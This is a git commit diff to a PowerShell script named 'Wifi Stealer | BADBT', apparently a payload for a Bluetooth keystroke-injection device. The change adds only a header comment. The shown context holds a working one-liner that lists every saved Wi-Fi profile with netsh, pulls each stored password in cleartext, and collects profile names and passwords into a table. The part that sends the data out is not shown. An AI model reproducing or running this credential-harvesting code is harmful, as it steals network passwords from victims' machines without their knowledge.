9fa49f3cc03e339138b9083379728886306babe0
Abhisek kumar <technoabh@gmail.com>
2024-03-02 18:18:52 +0530

    updated the code
    updated the code

--- badbt-wifi-stealer-fzero/badbt-wifi-stealer.ps1
+++ badbt-wifi-stealer-fzero/badbt-wifi-stealer.ps1
@@ -1,3 +1,9 @@
+#===============================================
+# Code Name : Wifi Stealer | BADBT
+# Author 	: netwrkspider
+# website  	: www.netwrkspider.org
+#===============================================
+
 #Capture wifi password 
 
 $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
